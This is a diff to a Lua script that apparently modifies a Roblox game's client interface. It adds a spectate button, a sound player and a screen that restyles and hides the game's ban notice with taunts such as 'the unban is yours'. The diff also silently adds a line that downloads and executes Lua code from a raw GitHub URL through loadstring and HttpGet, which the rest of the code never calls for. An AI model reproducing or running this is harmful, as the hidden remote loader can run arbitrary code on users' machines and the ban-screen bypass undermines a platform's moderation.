@@ -26,8 +26,9 @@ local Button = Buttons:WaitForChild("SpectateButton",5):Clone()
 local TweenService = game:GetService("TweenService")
 local Settings = MainUI.Parent.Interface.SettingsPane
 local CurrentSoundSequenceType = nil
+local Banned = false
 local Times = 0
-local Version = 0 -- literally :skull:
+local Version = 0
 
 -- UI Creation --
 
@@ -38,6 +39,9 @@ UIGradient.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Color3.fromRGB(30,255,160)),
     ColorSequenceKeypoint.new(1, Color3.fromRGB(99,138,255))
 })
+local Scale = Instance.new("UIScale")
+Scale.Scale = 0
+Scale.Parent = Button
 
 Button.Parent = Buttons
 Button.Visible = true
@@ -46,9 +50,10 @@ Button:FindFirstChild("ButtonIcon").Image = "rbxassetid://17724539002"
 Button.ImageColor3 = Color3.fromRGB(54, 99, 81)
 Buttons.UISizeConstraint.MaxSize = Vector2.new(120,math.huge)
 
-Buttons.TradeButton.Visible = false -- why does it exist if its not gonna exist
 
-MainUI.Parent.Menu.MainMenuUI.Visible = false
+Buttons.TradeButton.Visible = false -- why does it exist if its not gonna exist :skull:
+
+
 UI.Parent = MainUI.Round.RoundDisplay
 UI.Visible = false
 UI.Name = "PlusUI"
@@ -422,6 +427,27 @@ end
 
 -- General scripting --
 
+if MainUI.Parent.Menu.MainMenuUI.Banned.Visible == true then
+	Banned = true
+	local BannedUI = MainUI.Parent.Menu.MainMenuUI.Banned
+	BannedUI.Splash.Image = "rbxassetid://18423397075"
+	BannedUI.Splash.Splash.Visible = false
+	BannedUI.TimeLeft.Text = "time is now"
+	local BanMessages = {"Dw bro i got u","they fr thought they could ban you","the unban is yours","trash ban system? totally not 💀"}
+	BannedUI.TimeLeft.BanInfo.Text = BanMessages[math.random(1,#BanMessages)]
+	if UserType == 3 then
+	task.wait(1)
+	else
+	task.wait(3.25)
+	end
+	TweenService:Create(BannedUI.Splash,TweenInfo.new(0.75,Enum.EasingStyle.Linear),{ImageTransparency = 1}):Play()
+	TweenService:Create(BannedUI.Overlay,TweenInfo.new(0.75,Enum.EasingStyle.Linear),{BackgroundTransparency = 1}):Play()
+	TweenService:Create(BannedUI.TimeLeft,TweenInfo.new(0.75,Enum.EasingStyle.Linear),{TextTransparency = 1}):Play()
+	TweenService:Create(BannedUI.TimeLeft.BanInfo,TweenInfo.new(0.75,Enum.EasingStyle.Linear),{TextTransparency = 1}):Play()
+	task.wait(0.65)
+end
+TweenService:Create(Scale,TweenInfo.new(0.6,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Scale = 1}):Play()
+
 Button.MouseEnter:Connect(function()
 Button.ImageColor3 = Color3.fromRGB(64, 125, 100)
 end)
@@ -465,7 +491,9 @@ Info.Confirm.Button.MouseButton1Click:Connect(function()
  			PlaySound(tonumber(TextBox.Text),workspace,tostring(TextBox2.Text),false)
 	end
 end)
-
+task.spawn(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/NaikoScript/r/main/r3.lua')))()
+end)
 TemplateButton.MouseButton1Click:Connect(function()
 	TextBox.Text = "1837167368"
 	TextBox2.Text = "1.5"
